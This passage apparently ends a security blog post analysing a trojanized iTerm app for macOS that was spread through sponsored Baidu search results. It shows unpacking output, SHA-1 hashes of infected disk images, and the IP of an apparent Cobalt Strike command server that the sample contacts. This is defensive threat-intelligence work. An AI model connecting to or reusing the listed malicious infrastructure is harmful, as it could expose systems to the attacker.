   5961476 <-   2003288   33.60%   macho/amd64   GoogleUpdate

Unpacked 1 file.

</pre>
</div>
<p>The unpacked binary has a SHA-1 of <code>184509b63ac25f3214e1bed52e9c4aa512a0fd9e</code>, and also is not detected as malicious on VirusTotal.</p>
<p>Unfortunately, the binary still packed, or at least obfuscated in some manner 😰</p>
<p>However, if we run it, it attempts to connect to <code>47.75.96.198</code> (on port 443). We can observe this connection via <a href="https://objective-see.com/products/netiquette.html">Netiquette</a>:
<img src="../images/blog/blog_0x66/nq.png"  width="100%" class="center" style="border-radius: 4px;">
</p>
<p>According to VirusTotal, as of two days ago, this IP address was found to be a Cobalt Strike Server:</p>
<img src="../images/blog/blog_0x66/server.png"  width="" class="center" style="border-radius: 4px;">

<p>&hellip;thus is possible that this binary in merely a Cobalt Strike beacon!</p>
<h3 id="conclusions">Conclusions</h3>
<p>In this post, we analyzed a trojanized version of the popular <code>iTerm</code> application, served up to users via sponsors search engine results on Baidu.</p>
<p>Since then it appears the Baidu has taken action to remove these malicious links, while, as noted Apple has revoked the code signing certificate (ab)used by the malware.</p>
<p>However, perhaps the issue was (or still is?) more widespread, as Zhi noted that the scale is &ldquo;massive&rdquo; and that trojanized apps are in play:</p>
<center>

</center>
<br>
<div class="note">
ℹ️ Other infected disk images include:
<p>SecureCRT.dmg (SHA-1: 6bdcc10c4d6527e57a904c21639807b0f31f7807) <br><br>
Navicat15_cn.dmg (SHA-1: 99395781fde01321306afeb7d8636af8d4a2631f) <br><br>
com.microsoft.rdc.macos (SHA-1: 432d907466f14826157825af235bd0305a05fe41)</p>
</div>
<p>&hellip;so, be careful out there!</p>
<br>
<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; border-radius: 10px;">
    <div style="text-align: left; padding-bottom: 10px;"><b><span style="font-size:20px"> 📚 The Art of Mac Malware</b></span></div>
    If this blog post pique your interest, definitely check out my new book on the topic of Mac Malware Analysis: 
    <br><br>
    <center>
      "<a href="https://taomm.org" class="inlineLink">The Art Of Mac Malware: Analysis</a>"
    </center>
    <br><br>
    <div align="right" style="padding-right:10px; padding-bottom:10px;">
    ...it's free online, and new content is regularly added! 
    </div>
</div>
<br>
<h3 id="-support-us">💕 Support Us:</h3>
<div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px;">
    <center>Love these blog posts? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>

</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> »
        </div>
    </li>

</ul>
</nav>

  </body>
</html>